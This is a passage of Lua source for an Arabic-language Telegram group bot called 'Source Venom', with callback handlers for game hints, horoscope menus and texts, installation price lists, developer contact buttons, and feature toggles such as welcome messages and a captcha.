return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/hakwl' then
local Text = 'لتجربه العلبه عليك ان تكتب اسالني في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/wyauuu' then
local Text = 'لتجربه العلبه عليك ان تكتب اختبار الذكاء في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/whklpp' then
local Text = 'لتجربه العلبه عليك ان تكتب مستقبلي في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/uwujjh' then
local Text = 'لتجربه العلبه عليك ان تكتب الابراج في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help12' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help13' then
local Text = 'لتجربه العلبه عليك ان تكتب انصحني في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help14' then
local Text = 'لتجربه العلبه عليك ان تكتب الصراحه في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help15' then
local Text = 'لتجربه العلبه عليك ان تكتب رزله في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help16' then
local Text = 'لتجربه العلبه عليك ان تكتب بتكره دا في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help17' then
local Text = 'للاستماع للاغاني عليك ان تكتب غنيلي في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help18' then
local Text = 'لتجربه العلبه عليك ان تكتب نسبه جمالي في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help19' then
local Text = 'لتجربه العلبه عليك ان تكتب كتبات في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help20' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help21' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help22' then
local Text = 'لتجربه العلبه عليك ان تكتب رد عليه يابوت في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help23' then
local Text = 'لتجربه العلبه عليك ان تكتب نكته في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help24' then
local Text = 'لتحميل من المواقع عليك ان تكتب اليتيوب في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help25' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك بالصور في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help56' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت بالصور في الشات🔰'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
--- callback added
if Text == '/add' then
local Teext =[[
𖥔 اهلا بك في قسم الالعاب ..↑↓
 اختر العبه الذي تريدها .↑↓
ده من الازرار بلاسفل . ↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '◗العاب السورس◖', callback_data="/mute-name"},{text = '◗الاضافات◖', callback_data="/change-photo"},
},
{
{text = '◗ متطوره◖', callback_data="/VNO"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/zVNOd' then
local Teext =[[
• اختر برجك عزيزي •📮،⍆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• الاسد ،🦁', callback_data="/zking"},{text = '• الثور 🐂', callback_data="/zzor"},
},
{
{text = '• العقرب 🦂', callback_data="/zakrb"},{text = '• القوس 🏹', callback_data="/zkos"},
},
{
{text = '• الحمل 🐐', callback_data="/zBanda"},
},
{
{text = '• السرطان 🦀', callback_data="/zsltan"},{text = '• العذراء 🦋', callback_data="/zazra"},
},
{
{text = '• الميزان ⚖', callback_data="/zmezan"},{text = '• الجدي 🦌', callback_data="/zgagy"},
},
{
{text = ' معرفة برجك 🧭', callback_data="/zporg"},
},
{
{text = '• الحوت 🐋', callback_data="/zhot"},
},
{
{text = '• الجوزاء 🌩', callback_data="/zguza"},{text = '• الدلو 🦯', callback_data="/zdlu"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/change-hhh' then
local Teext =[[
𖥔 اليك قائمه الاسعار في الاسفل ..↑↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'اسعار التنصيب', callback_data="/change-hklp"},{text = 'اسعار السورسات', callback_data="/change-gfgjo"},
},
{
{text = 'نبذه عن السورس', callback_data="/change-ghjjgyy"},
},
{
{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/change-hklp' then
local Teext =[[
 سعر التنصيب علي سورس فينوم
 سعر التنصيب العادي 25ج
 سعر التنصيب المميز 35 ج
تواصل مع المطورين لتنصيب
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹ＤＥＶＩＤ༈˼',url="t.me/de_vi_d"},{text = '𓌹 ˹ＤＯＮＧＯＬ¹˼ 𓌺 ', url="t.me/UU_DO_N"}},
{{text = '˹ᴛᴀᴡᴏsʟ˼',url="t.me/TEAMVENOM1"}}, 
{{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/change-gfgjo' then
local Teext =[[
سعر السورس عندنا
 السورسات بتبدا مت100لي 240ج
 سعر المصنع200
 سعر السيرفر ،100,و 4 بي120, 8بي160
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹الــمــبــرمــج بــانــدا˼', url="t.me/QSVNO"}},
{{text = '˹تــواصــل بــانــدا˼',url="t.me/TEAMVENOM1"}}, 
{{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/change-ghjjgyy' then
local Teext =[[
📬 • 𝐚𝐛𝐨𝐮𝐭 𝐭𝐡𝐞 𝐬𝐨𝐮𝐫𝐜𝐞
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔سورس خاص في حماية المجموعات من التفليش 🚸 . 
𖥔تستطيع تنصيب بوتك وتصبح المطور الاساسي 👨🏼‍✈️.
𖥔تستطيع اضافة قناتك اشتراك اجباري في بوتك ⚠️ .
𖥔سرعة في اداء البوت ومزايا حصرية فقط لسورسنا 〽️ .
𖥔لمعرفة ميزات اكثر عن السورس زور قناة التحديثات .
𖥔اطلب بوتك الأن 🌐 .
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
{{text = '˹تــواصــل الـسـورس˼',url="t.me/TEAMVENOM1"}}, 
{{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/change-siusr' then
local Teext =[[
𖢜 W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙴𝙽𝙾𝙼⇣
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹ʙᴀɴᴅᴀ ғᴜᴄᴋ σғғ↺˼',url="t.me/Q_0_ll"},{text = '˹𖢜 𝗔𝗛𝗠𝗘𝗗 ⤶˼ ', url="t.me/AY_AHD"}},
{{text = '˹ＤＥＶＩＤ༈˼',url="t.me/de_vi_d"},{text = '𓌹 ˹ＤＯＮＧＯＬ¹˼ 𓌺 ', url="t.me/UU_DO_N"}},
{{text = '˹ᴛᴀᴡᴏsʟ˼',url="t.me/TEAMVENOM1"}}, 
{{text = '𖥔 مــطــور الــبــوت 𖥔', url="http://t.me/"..sudos.UserName}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/zzor' then
local Teext =[[
برج الثور ( 20/4 - 20/5 )

الكوكب : الزهرة

أرقام الحظ : 11, 29, 29, 37, 56

الأحجار : الزمرد , الفيروز

البرج : ترابي

يتوافق مع :  برج العذراء   و برج الجدي -  برج السرطان - برج الحوت 

الأعمال الملائمة  : موظفي بنك- فنانين- محاسبين-موسيقيين- عمال

إيجابيات برج الثور : صبور- يمكن الاعتماد عليه- محب- من طبعه الإصرار والتصميم- هادئ ويحب الطمأنينة
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/zguza' then
local Teext =[[
برج الجوزاء ( 21/5 - 20 /6 ) كوكب برج الجوزاء : عطارد أرقام الحظ  لبرج الجوزاء: 12-21-30-48-47 أحجار برج الجوزاء : العقيق نوع برج الجوزاء : هوائي يتوافق برج الجوزاء مع : برج الميزان - برج الحمل - برج الأسد - برج القوس الأعمال الملائمة لبرج الجوزاء : برامج حوارية - تجار - مك
إيجابيات  برج الجوزاء: ذكي - متقد الذهن - فصيح - لدية روح الشباب - متعدد المواهب - اجتماعي - متأقلم

سلبيات برج الجوزاء : متوتر - غير ثابت على حال - عصبي - ماكر- فضولي
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/zdlu' then
local Teext =[[
برج الدلو ( 20/1 - 18/2 )

الكوكب : زحل

ارقام الحظ : 11- 29- 38-47- 56

الاحجار : الفيروز

البرج : هوائي

يتوافق مع : برج الجوزاء - برج الميزان -برج الحمل -برج الجوزاء

الاعمال الملائمة برج الدلو : مخترعين- سياسيين- كتاب- علماء- رواد فضاء- منجمين

ايجابيات برج الدلو  : ودود، إنساني، صادق، وفي وصاحب ولاء، مبدئي، مبتكر

سلبيات برج الدلو : مستقل وذكي. عنيد، يقف ضد الأمور، مشاكس، غير متوقع التصرفات، غير عاطفي وله استقلاليته.
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end


if Text == '/zhot' then
local Teext =[[
برج الحوت ( 19/2 - 20/3 )

الكوكب : المشتري ارقام الحظ : 12- 21- 39- 48- 57

الاحجار : حجر القمر

البرج : مائي

يتوافق مع : برج السرطان - برج العقرب -برج الثور

الاعمال الملائمة : أطباء بيطريين- علماء أحياء- فنانين- أطباء-موسيقيين- علماء نفس

ايجابيات برج الحوت : صاحب خيال، حساس، عاطفي، لطيف، غير أناني، لا تهمه الماديات، صاحب حدس وبديهة ويتعاطف مع الآخرين.

سلبيات برج الحوت  : مثالي و يتهرب من الواقع، كتوم للأسرار وغامض، إرادته ضعيفة وسهل الانقياد.
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end


if Text == '/zakrb' then
local Teext =[[
برج العقرب ( 24/10 - 21/11 )

الكوكب : المريخ

ارقام الحظ : 17- 26- 35- 44-53

الاحجار : الياقوت-العقيق

البرج : مائي

يتوافق مع : برج الحوت - برج السرطان - برج الثور

الاعمال الملائمة : أطباء- محققين- علماء بيئة- مهندسين- عملاء سريين.

ايجابيات برج العقرب: صاحب عزيمة- قوي- عاطفي- ذو حدس- ذو طاقة - مثير - شخصيته جذابة- كتوم للأسرار

سلبيات برج العقرب : كثير الرفض- يحب السيطرة - محب للتملك- غيور -عنيد.
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/zkos' then
local Teext =[[
برج القوس ( 22/11 - 21/12)
الكوكب : المشتري

ارقام الحظ : 18-27- 36-45- 54

الاحجار : الفيروز

البرج : ناري

يتوافق مع : الحمل - الاسد-الجوزاء

الاعمال الملائمة : وكلاء سفر-مكتشفين-بروفيسورات- سفراء- تجار

ايجابيات : متفائل، محب للحرية، مرح، له روح مرحة جميلة، صادق، مستقيم، ذكي وصاحب فلسفة
سلبيات : متفائل بصورة عمياء، مهمل، غير مسؤول، سطحي، غير لبق، قلق
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end


if Text == '/zmezan' then
local Teext =[[
برج الميزان ( 23/9 - 23/10 )

الكوكب : الزهرة

ارقام الحظ : 6- 16- 25- 34- 43- 52

الاحجار : الماس

البرج : هوائي

يتوافق مع : برج الدلو - برج الجوزاء - برج القوس

الاعمال الملائمة : وظائف دبلوماسية- قضاة- مستشارين- أخصائيين نفسيين - فنانين

ايجابيات برج الميزان : دبلوماسي، مؤدب، رومانسي، ساحر، سهل النقياد، اجتماعي، صاحب مبادئ ومسالم

سلبيات برج الميزان : متردد، قابل للتغير، ساذج، يتأثر بسرعة، منطوي على نفسه.
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end



if Text == '/zazra' then
local Teext =[[
برج العذراء ( 23/8 - 22/9 )

الكوكب : عطارد

ارقام الحظ : 6- 15- 24- 33- 42- 51

الاحجار : العقيق

البرج : ارضي

يتوافق: مع   برج الجدي   ، برج الثور ،برج السرطان ، برج العقرب

الاعمال الملائمة : كيميائيين- أطباء-محققين- أخصائيي تغذية- أطباء بيطريين- مدراء- مقاولين
ايجابيات برج العذراء : متواضع، خجول، دقيق، يمكن الاعتماد عليه، عملي، مجتهد، ذكي ويميل إلى التحليل
سلبيات برج العذراء : سريع الانزعاج، كثير القلق، كثير الانتقاد، قاسي، يسعى نحو الكمالية ومحافظ
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/zking' then
local Teext =[[
برج الأسد ( 23/6 - 22/8 )

الكوكب : الشمس

ارقام الحظ : 14- 13- 32-41- 50

الاحجار : الياقوت،العنبر

البرج : ناري

يتوافق مع : برج القوس - برج الحمل - برج الدلو

الاعمال الملائمة : مدراء، مهندسين معماريين، مخترعين، مدرسين، رياضيين ومدراء

ايجابيات برج الأسد : كريم، دافئ القلب، مبدع، حماسي، واسع العقل، وفي محب
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/zsltan' then
local Teext =[[
برج السرطان ( 22/6 - 22/7 )

الكوكب : القمر

ارقام الحظ : 13- 22-31-40- 48- 57

الاحجار : اللؤلؤ،العنبر-الياقوت

البرج : مائي

يتوافق مع : برج العقرب ، برج الحوت ،برج الجدي ،برج الثور

الاعمال الملائمة : أطباء، صيادلة، مدرفينوم، أخصائيو تغذية، شيف، سماسرة

ايجابيات برج السرطان : عاطفي، محب، صاحب حدس وبديهة، صاحب خيال واسع
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/zBanda' then
local Teext =[[
برج الحمل :- ( 21/3 - 19/4 )

الكوكب : المريخ

أرقام الحظ : 10 ,19, 28, 37, 46, 55

الأحجار : الياقوت - الماس

البرج : نارى

يتوافق مع :برج الاسد -برج  القوس - برج الجوزاء -برج  الدلو

الأعمال الملائمة : رجل إطفاء ، طبيب ، ميكانيكي ، طبيب أسنان ، لاعب رياضي محترف أو رجل أعمال
سلبيات برج الحمل : أناني - سريع الغضب - متهور - عديم الصبر – الطيش
  مميّزات برج الحمل ١.١ الثقة العالية بالنّفس ١.٢ روح القيادة ١.٣ الطاقة الإيجابيّة ١.٤ الشجاعة ١.٥ الإبداع ١.٦ الطّموح ١.٧ حبّ المغامرة ١.٨ الإخلاص ١.٩ الاستقلاليّة ٢ عيوب برج الحمل ٢.١ الأنانيّة ٢.٢ حبّ لفت الانتباه ٢.٣ الغضب ٢.٤ احتكار الحديث ٢.٥ التسرّع
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/zgagy' then
local Teext =[[
برج الجدي ( 22/12 - 19/1 )

الكوكب : زحل

ارقام الحظ: 10-28- 37-46- 55

الاحجار : العقيق اليماني

البرج : ترابي

يتوافق مع : برج الثور- برج العذراء

الاعمال الملائمة : مدراء عامين- مدراء-وزراء، -مهندسي كومبيوتر.

ايجابيات برج الجدي: عملي، عاقل- طموح- منظم- صبور- حذر- صاحب روح مرحة ومتحفظ

سلبيات برج الجدي : متشائم- متعلق بالأقدار- بائس- حاقد، متمسك بالتقاليد أكثر من اللازم وجامد.
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/zporg' then
local Teext =[[
❣- برج الجدي: من 12/22 - الى 1/19•
❣- برج الدلو: من 1/20 - الى 2/18•
❣- برج الحوت: من 2/19 - الى 3/20•
❣- برج الحمل: من 3/21 - الى 4/19•
❣- برج الثور: من 4/20 - الى 5/20•
❣- برج الجوزاء: من 5/21 - الى 6/20•
❣- برج السرطان: من 6/21 - الى 7/21•
❣- برج الاسد: من 7/23 - الى 8/22•
❣- برج العذراء: من 8/23 - الى 9/22•
❣- برج الميزان: من 9/23 - الى 10/22•
❣- برج العقرب: من 10/23 - الى 11/21•
❣- برج القوس: من 11/22 - الى 12/21•
 ●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/zVNOd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/lockwelcm' then
local Text = '• تم تفعيل الترحيب '
database:set(bot_id.."Chek:Welcome"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opawelcm' then
local Text = '• تم تعطيل الترحيب '
database:del(bot_id.."Chek:Welcome"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockCickp' then
local Text = '• تم تفعيل التحقق '
database:set(bot_id.."CAPTCHA"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opCickp' then
local Text = '• تم تعطيل التحقق '
database:del(bot_id.."CAPTCHA"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockreb' then
local Text = '• تم تفعيل ردود السورس '
database:set(bot_id.."my_GHoeq2:status"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opareb' then
local Text = '• تم تعطيل ردود السورس '
database:del(bot_id.."my_GHoeq2:status"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockamr' then
local Text = '• تم تفعيل حساب العمر '
database:set(bot_id.."VNO:age_Bots"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opamar' then
local Text = '• تم تعطيل حساب العمر '
database:del(bot_id.."VNO:age_Bots"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/lockgmale' then
local Text = '• تم تفعيل نسبه جمالي '
database:set(bot_id.."pp_photo:status"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/opagmale' then
local Text = '• تم تعطيل نسبه جمالي '
database:del(bot_id.."pp_photo:status"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
